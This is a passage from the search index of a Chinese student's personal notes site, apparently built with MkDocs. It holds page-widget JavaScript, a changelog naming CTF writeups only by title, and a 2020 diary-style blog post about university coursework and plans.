{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11782 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11782 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2025 \u00b6 2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee 2024 \u00b6 2024-10-22 \u00b6 ZJUCTF 2024 Writeups 2023 \u00b6 2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2025","text":"2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee","title":"2025"},{"location":"changelog/#2024","text":"2024-10-22 \u00b6 ZJUCTF 2024 Writeups","title":"2024"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"blog/","text":"","title":"Index"},{"location":"legacy/","text":"Legacy \u00b6 Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O Table of Contents \u00b6 Old Blog \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Legacy"},{"location":"legacy/#legacy","text":"Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O","title":"Legacy"},{"location":"legacy/#table-of-contents","text":"Old Blog \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"legacy/old_blog/20200309/","text":"\u5f00\u7aef \u00b6 \u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002 \u4e00\u5207\u7684\u5f00\u7aef \u00b6 \u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01 \u8fc7\u53bb\u534a\u5e74\u7684\u56de\u987e \u00b6 \u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 \u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a \u2714\u5de5\u4f5c\u7ec4\u4e3b\u9898\u63a8\u6587 \u2714\u5b66\u6587\u6d3b\u52a8\u63a8\u6587 \u2714\u5cf0\u4f1a\u5e72\u4e8b\u7ade\u9009 \u2714\u82f1\u8bed\u5f71\u8bc4 \u2714\u8fd0\u52a8\u4e0e\u8111\u4e2a\u4eba\u4f5c\u4e1a \u2714\u90e8\u95e8\u5723\u8bde\u5185\u5efa\u7b56\u5212 \u2714\u7ba1\u7406\u6c9f\u901a\u5c0f\u7ec4\u4f5c\u4e1a \u2714\u7ba1\u7406\u6c9f\u901a\u4e2a\u4eba\u4f5c\u4e1a \u2714\u63a8\u6587\u7ec4\u65e5\u5e38\u63a8\u6587 \u2714\u8fc7\u5e74\u4e91\u5cf0\u65b9\u9635\u6392\u7ec3 \u2714\u5fae\u79ef\u5206\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ebf\u4ee3\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ba1\u7406\u6c9f\u901a\u8bfe\u5802\u671f\u672b\u8003\u590d\u4e60 \u2714\u671f\u672b\u590d\u4e60\uff08\u5927\u82f1\u3001\u8fd0\u52a8\u4e0e\u8111\u3001\u5fae\u79ef\u5206\u3001C\u7a0b\u3001\u7ebf\u4ee3\u3001\u601d\u4fee\u3001\u7ecf\u6d4e\u6cd5\uff09 \u603b\u5f97\u6765\u8bf4\uff0c\u5356\u529b\u5212\u6868\uff0c\u539f\u5730\u6253\u8f6c\u3002\u4e0d\u8fc7\u4e5f\u5e76\u975e\u6beb\u65e0\u6536\u83b7\uff0c\u5927\u6982\u4e5f\u660e\u786e\u4e86\u4e8e\u81ea\u5df1\u800c\u8a00\uff0c\u54ea\u4e9b\u4e1c\u897f\u5177\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\u548c\u91cd\u8981\u6027\u3002\u6709\u559c\u6709\u5fe7\uff0c\u4e0d\u8fc7\u4eba\u4e4b\u5e38\u60c5\uff1b\u60a3\u5f97\u60a3\u5931\uff0c\u4e5f\u56e0\u5fc3\u4e2d\u6709\u7684\u3002 \u5c55\u671b0202\u8fd9\u4e00\u5e74 \u00b6 \u8bfe\u4e1a \u00b6 \u9996\u5148\uff0c\u5f53\u7136\u662f\u6700\u7d27\u8981\uff08\u8981\u547d\u7684\u5b66\u4e1a\u65b9\u9762\uff0c\u7531\u4e8e\u4e0a\u5b66\u671f\u56e0\u8fc7\u591a\u5b66\u5206\u5bfc\u81f4\u7cbe\u529b\u5206\u6563\u800c\u7f8e\u4e2d\u4e0d\u8db3\uff0c\u6240\u4ee5\u8fd9\u5b66\u671f\uff0c\u6211\u5728\u5b66\u5206\u65b9\u9762\u7ed9\u81ea\u5df1\u7559\u6709\u8f83\u5927\u7684\u8c03\u8282\uff08\u73a9\u800d\u7a7a\u95f4\uff0c\u4f46\u662f\u6c34\u8bfe\u53d8\u5c11\uff0c\u5176\u5b9e\u4e5f\u548c\u4e0a\u5b66\u671f\u534a\u65a4\u516b\u4e24\u3002\u603b\u4e4b\uff0c\u4e00\u4e2a\u65b9\u9488\u2014\u2014\u786c\u8bfe\u7a33\u4e00\u624b\uff0c\u6c34\u8bfe\u5077\u4e00\u628a\u3002\u7531\u4e8e\u53cc\u98de\u53f2\u7eb2\u548c\u9a6c\u539f\uff0c\u96be\u514d\u4f1a\u9677\u5165\u9e45\u9888\u7684\u6ce5\u6dd6\uff0c\u5f97\u6ce8\u610f\u7406\u667a\u51b7\u9759\u5730\u809d\u3002\u4fdd\u6301\u7a33\u5b9a\u5427\uff0c\u5176\u4ed6\u4e5f\u5c31\u8fd9\u6837\u3002 \u5bf9\u4e8e\u8f85\u4fee\u4e4b\u7c7b\uff0c\u9274\u4e8e\u8f85\u4fee\u7684\u6beb\u65e0\u5b58\u5728\u611f\uff0c\u51b3\u5b9a\u53bb\u8bd5\u8bd5\u5de5\u9ad8\u73ed\u3002\uff08\u8349\u7387\u5730\u77ac\u95f4\u505a\u51b3\u5b9a \u5de5\u4f5c \u00b6 \u7ec4\u7ec7\u65b9\u9762\uff0c\u5b66\u751f\u4f1a\u7684\u6d3b\u52a8\u7531\u4e8e\u67d0\u4e9b\u4e0d\u53ef\u63a7\u56e0\u7d20\uff08\u9886\u5bfc\u6e05\u5947\u7684\u8111\u56de\u8def\u548c\u538b\u69a8\u76f4\u63a5\u88ab\u53d6\u6d88\uff0c\u4f30\u6478\u7740\u63a5\u4e0b\u6765\u4e5f\u5c31\u662f\u4e00\u4e9b\u5c0f\u63a8\u6587\u5de5\u4f5c\u548c\u7559\u4efb\u5de5\u4f5c\uff0c\u521d\u6b65\u8ba1\u5212\u62d2\u7edd\u7559\u4efb\uff0c\u867d\u7136\u8bf4\u5f53\u4ec1\u4e0d\u8ba9\uff0c\u4f46\u662f\u4eba\u5404\u6709\u5fd7\u5427\u3002\u56e2\u5de5\u59d4\u65b9\u9762\uff0c\u5e94\u8be5\u8fd8\u6709\u4e00\u4e2a\u5ef6\u671f\u7684\u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae\u7684\u9879\u76ee\u548c\u65e5\u5e38\u503c\u73ed\uff0818r/h\u7684\u5ec9\u4ef7\u52b3\u52a8\u529b\uff0c\u4e5f\u4e0d\u7559\u4efb\u3002 \u793e\u56e2\u65b9\u9762\uff0c\u4fbf\u662f\u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2\uff0c\u4e0a\u4e2a\u5b66\u671f\u5f00\u5b66\u7684\u5934\u8111\u4e00\u70ed\u52a0\u5165\u7684orz\u3002\u4e0a\u5b66\u671f\u5185\u8bad\u7684Torch\u3001OpenCV\u65e9\u5df2\u88ab\u629b\u4e4b\u8111\u540e\uff0c\u8fc7\u4e8e\u6c34\u7684\u540e\u679c\u5c31\u662f\u8fd9\u5b66\u671f\u7684\u70b8\u88c2\u3002\u61a8\u61a8\u5982\u6211\uff0c\u9519\u8fc7\u4f8b\u4f1a\u88ab\u81ea\u52a8\u5206\u914d\u4efb\u52a1\uff0c\u7adf\u7136\u662f\u6211\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u6811\u8393\u6d3e/STM32\u3002\u6682\u4e14\u5148\u81ea\u5b66\u7740\u5427\uff0c\u53cd\u6b63\u662f\u793e\u56e2\uff0c\u5927\u4e0d\u4e86\u5495\u5495\u5495\uff08\u9003\u3002 \u5de5\u4f5c\u8ba1\u5212 \u4e91\u5cf0\u5b66\u751f\u4f1a \u7559\u4efb\u5de5\u4f5c \u65e5\u5e38\u63a8\u6587 \u56e2\u5de5\u59d4 \u65e5\u5e38\u503c\u73ed \u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae \u7559\u4efb \u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2 \u590d\u4e60\u5185\u8bad\u5185\u5bb9 Matplotlib Numpy Torch OpenCV \u5b8c\u6210\u6811\u8393\u6d3e/STM32\u63a8\u6587 \u505a\u5c0f\u7ec4\u9879\u76ee \u4e1a\u4f59 \u00b6 \u975e\u9893\u5e9f\u4e4b\u4e8b \u00b6 \u8fd9\u4e00\u7c7b\u4e8b\u60c5\u5c31\u662f\u90a3\u79cd\u8ba1\u5212\u548c\u5b8c\u6210\u6bd4\u5de8\u9ad8\u7684\uff0c\u6bcf\u6b21\u90fd\u4ee4\u81ea\u5df1\u61ca\u6094\u7684\u3002\u867d\u7136\u5982\u6b64\uff0c\u8ba1\u5212\u8fd8\u662f\u8981\u6709\u7684 TODO IMPORTANCE DS \u4e2d TOEFL \u9ad8 Blog \u4f4e Project \u4f4e Reading \u4e2d \u5815\u843d\u5427 \u00b6 \u867d\u7136\u662f\u4e00\u70b9\u7a7a\u865a\u7684\u5feb\u4e50\uff0c\u4f46\u662f\u4e5f\u662f\u4eba\u751f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5185\u5bb9\uff0c\u5728\u60c5\u611f\u4e0a\u5177\u6709\u66f4\u9ad8\u7684\u4ef7\u503c\u548c\u610f\u4e49\u5427\u3002 \u4f19\u4f34\u90ca\u6e38 \u534a\u591c\u72c2\u6b22 \u3002\u3002\u3002\uff08\u597d\u53ed\uff0c\u60f3\u4e0d\u51fa\u6765\u4e86\uff0c\u53cd\u6b63high\u5c31\u5bf9\u4e86\uff09 \u5199\u5728\u6587\u672b \u00b6 \u788e\u788e\u5ff5\u4e86\u8fd9\u4e48\u4e45\uff0c\u4e5f\u4e0d\u77e5\u4e91\u4e91 \u4e3b\u8981\u662f\u642d\u5efa\u4e86\u4e00\u4e2aBlog\uff0c\u603b\u4e0d\u80fd\u8ba9\u5b83\u7a7a\u7a7a\u5982\u4e5f\uff0c\u6240\u4ee5\u5c31\u4e92\u62fc\u4e71\u51d1\u5730\u5148\u5199\u4e00\u7bc7\u6491\u6491\u573a\u9762\uff0c\u8fd8\u5f97Blog\u8981\u7d20\u5168\u4e86\u3002\u54c8\u54c8\u54c8\uff01 \u7adf\u7136\u5199\u4e86\u90a3\u4e48\u4e45\uff0c\u4e3b\u8981\u4e2d\u95f4\u5404\u79cd\u4e8b\u60c5\u5c42\u51fa\u4e0d\u7a77\uff0c\u5207\u8bb0\uff0c\u4e00\u5fc3\u4e0d\u53ef\u591a\u7528\u554a\uff01 2020.3.9 21:45","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_1","text":"\u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_2","text":"\u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01","title":"\u4e00\u5207\u7684\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_3","text":"\u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 \u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a 